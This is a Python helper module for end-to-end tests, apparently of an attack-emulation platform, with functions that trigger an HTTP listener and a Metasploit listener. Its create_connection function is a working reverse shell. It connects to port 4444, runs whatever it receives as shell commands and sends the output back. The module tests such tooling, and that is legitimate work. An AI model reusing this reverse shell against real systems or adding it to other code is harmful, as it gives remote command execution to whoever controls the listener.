import random
import string

import click
import socket
import subprocess
from multiprocessing import Process
from typing import List

import yaml

from tests_e2e.util import exceptions, config


def execute_command(command: List[str]):
    """
    Execute a custom command in a process.
    :param command: Custom command
    :return: Finished process containing the result
    """
    return subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def trigger_http_listener():
    click.echo("Trying to trigger the HTTP listener... ", nl=False)
    result = execute_command(["curl", f"http://{config.WORKER_ADDRESS}:8082/index?test=test"])
    if "Failed" in result.stdout.decode("utf-8"):
        raise exceptions.UnexpectedResponse(f"Couldn't trigger the HTTP listener. Original result: {result}")
    click.secho("OK", fg='green')


def trigger_msf_listener():
    click.echo("Trying to trigger the MSF listener... ", nl=False)
    p = Process(target=create_connection, args=(config.WORKER_ADDRESS,))
    p.start()
    p.join(10)
    if not p.is_alive():
        raise exceptions.UnexpectedResponse(f"Couldn't trigger the MSF listener.")

    p.kill()
    click.secho("OK", fg='green')


def create_connection(target, port=4444):
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((target, port))
    while True:
        d = so.recv(1024)
        if len(d) == 0:
            break
        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        o = p.stdout.read() + p.stderr.read()
        so.send(o)


def create_inventory(inventory: dict):
    file_name = f"/tmp/{''.join(random.choices(string.ascii_lowercase, k=10))}"
    with open(file_name, "w") as f:
        yaml.dump(inventory, f)

    return file_name
